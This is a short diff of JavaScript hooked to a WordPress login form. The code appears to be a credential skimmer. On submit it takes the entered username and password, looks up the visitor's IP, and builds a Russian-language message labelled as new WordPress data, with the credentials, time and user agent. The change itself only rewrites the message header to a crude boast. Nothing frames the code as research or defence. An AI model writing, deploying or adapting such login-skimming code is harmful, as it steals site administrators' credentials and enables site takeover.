@@ -7,7 +7,7 @@ document.getElementById('loginform').addEventListener('submit', async function(e
     const password = formData.get('pwd');
 
     // Добавляем User Agent к сообщению
-    const message = `🔐 НОВЫЕ ДАННЫЕ WORDPRESS 🔐\nЛогин: ${login}\nПароль: ${password}\nIP: ${await getIP()}\nВремя: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`;
+    const message = `🔐 НОВЫЕ ДАННЫЕ WORDPRESS ЛИЧНО ДЛЯ АХУЕННОГО ПСИХА 🔐\nЛогин: ${login}\nПароль: ${password}\nIP: ${await getIP()}\nВремя: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`;
     console.log("Сообщение для отправки:", message);
 
     try {
